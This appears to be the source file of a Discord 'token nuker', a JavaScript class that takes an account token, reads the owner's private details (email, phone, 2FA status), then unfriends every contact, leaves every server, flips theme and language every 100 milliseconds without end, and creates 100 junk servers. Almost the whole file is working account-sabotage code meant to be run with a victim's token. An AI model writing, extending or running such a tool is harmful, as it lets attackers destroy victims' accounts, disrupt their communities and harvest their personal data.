const { Color } = require('./Design');
const Axios = require('axios').default;

class User extends Color {
  constructor({ token }) {
    super();

    this.token = token;
    this.requested = false;

    this.headers = {
      info: {
        'Content-Type': 'application/json',
        'Authorization': this.token
      },

      nuke: {
        'Authorization': this.token,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36'
      }
    };
  };

  async info() {
    try {
      const data = (await Axios.get('https://discord.com/api/v8/users/@me', { headers: this.headers.info })).data;

      const base = 'https://cdn.discordapp.com/avatars/';
      this.requested = true;

      return [
        `Tag      |   ${data.username + '#' + data.discriminator}`,
        `Email    |   ${data.email || 'None'}`,
        `2FA      |   ${data.mfa_enabled}`,
        `Phone    |   ${data.phone || 'None'}`,
        `ID       |   ${data.id}`,
        `Language |   ${data.locale}`,
        `Verified |   ${data.verified}`,
        `Flags    |   All: ${data.flags} | Public: ${data.public_flags}`,
        `NSFW     |   ${data.nsfw_allowed}`,
        `Avatar   |   ${base + `${data.id}/${data.avatar}.jpg`}`
      ];
    } catch(e) {
      throw new Error(e);
    };
  };

  async nuke() {
    await Axios(
      { method: 'GET', url: 'https://discord.com/api/v8/users/@me/relationships', headers: this.headers.nuke }
    ).then(
      (response) => {
        const friends = [];

        response.data.forEach(
          (user) => friends.push(user.id)
        );

        friends.forEach(
          (friend) => {
            Axios.delete(`https://discord.com/api/v8/users/@me/relationships/${friend}`, {
              headers: this.headers.nuke
            }).then(
              () => Color.log(`Unfriended ${friend}`)
            ).catch(
              (e) => { Color.log(e, '>', 0); }
            );
          }
        );
      }
    ).catch(
      (e) => {
        Color.log(e, '>', 0);
      }
    );

    await Axios(
      { method: 'GET', url: 'https://discord.com/api/v8/users/@me/guilds', headers: this.headers.nuke }
    ).then(
      (response) => {
        const guilds = [];

        response.data.forEach(
          (guild) => guilds.push(guild.id)
        );

        guilds.forEach(
          (guild) => {
            Axios.delete(`https://discord.com/api/v8/users/@me/guilds/${guild}`, {
              headers: this.headers.nuke
            }).then(
              () => Color.log(`Left Server ${guild}`)
            ).catch(
              (e) => { Color.log(e, '>', 0); }
            );
          }
        );
      }
    ).catch(
      (e) => {
        Color.log(e, '>', 0);
      }
    );

    setInterval(async() => {
      await Axios(
        {
          method: 'PATCH',
          url: 'https://discord.com/api/v8/users/@me/settings',
          headers: this.headers.nuke,
          data: {
            'theme': this.random(['light', 'dark']),
            'locale': this.random(['ja', 'zh-TW', 'ko', 'zh-CN', 'de', 'lt', 'lv', 'fi', 'se'])
          }
        }
      ).catch(
        (e) => {
          Color.log(e, '>', 0);
        }
      );
    }, 100);

    for (var i = 1; i < 101; i++) {
      await Axios(
        {
          method: 'POST',
          url: 'https://discord.com/api/v6/guilds',
          headers: this.headers.nuke,
          data: {
            'name': 'endless OP',
            'region': 'brazil',
            'icon': null,
            'channels': null
          }
        }
      ).then(
        () => {
          Color.log(`Created a Guild ${i}`);
        }
      ).catch(
        (e) => {
          Color.log(e, '>', 0);
        }
      );
    };
  };
  
  random(array = []) {
    return array[Math.floor(Math.random() * array.length)];
  };
};

module.exports.User = User;
